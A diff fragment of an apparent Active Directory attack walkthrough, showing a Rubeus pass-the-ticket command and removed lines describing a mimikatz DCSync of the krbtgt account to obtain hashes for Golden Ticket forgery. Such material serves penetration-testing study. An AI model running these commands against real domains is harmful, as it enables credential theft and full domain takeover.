@@ -59,9 +59,3 @@ If the attack succeeds a base64 encoded TGT will arrive in the session we have `
 ```powershell
 .\Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
 ```
-With the ticket of the DC machine account in our current user context we can trigger a DC Sync to dump the hash of any user, notably including the `krbtgt` user. This is the service account of the Key Distribution Center (KDC) service that runs on the DCs. It is a root of trust for Kerberos based domains. From `mimikatz.exe`
-```
-lsadump::dcsync /domain:infinity.com /user:INFINITY\krbtgt
-```
-From the output of the above grab the LM and NTLM hashes. These will be key to the forgery of a Golden ticket.
-
